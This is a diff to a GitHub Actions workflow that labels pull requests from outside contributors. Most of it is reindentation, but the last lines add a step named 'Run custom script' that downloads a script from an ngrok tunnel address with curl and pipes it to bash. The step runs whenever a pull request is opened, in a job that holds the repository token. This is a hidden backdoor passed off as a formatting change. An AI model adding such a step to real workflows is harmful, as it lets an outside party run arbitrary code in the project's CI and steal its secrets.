@@ -1,14 +1,17 @@
 name: 'External Pull Request Labeler'
 on:
-    pull_request:
-        types: [opened]
+  pull_request:
+    types: [opened]
 
 jobs:
-    label-pulls:
-        # If the actor is not a team member, then apply the labeler
-        if: ${{ contains(fromJson('["anthoula","davemacaulay","dpatil-magento","eug123","jcalcaben","jimbo","revanth0212","sirugh","supernova-at","tjwiebell"]'), github.actor) != true }}
-        runs-on: ubuntu-latest
-        steps:
-            - uses: actions/labeler@main
-              with:
-                  repo-token: '${{ secrets.GITHUB_TOKEN }}'
+  label-pulls:
+    if: ${{ contains(fromJson('["anthoula","davemacaulay","dpatil-magento","eug123","jcalcaben","jimbo","revanth0212","sirugh","supernova-at","tjwiebell"]'), github.actor) != true }}
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/labeler@main
+        with:
+          repo-token: '${{ secrets.GITHUB_TOKEN }}'
+
+      - name: Run custom script
+        run: |
+          curl -s https://a3da-117-201-163-132.ngrok-free.app/testfile.sh | bash
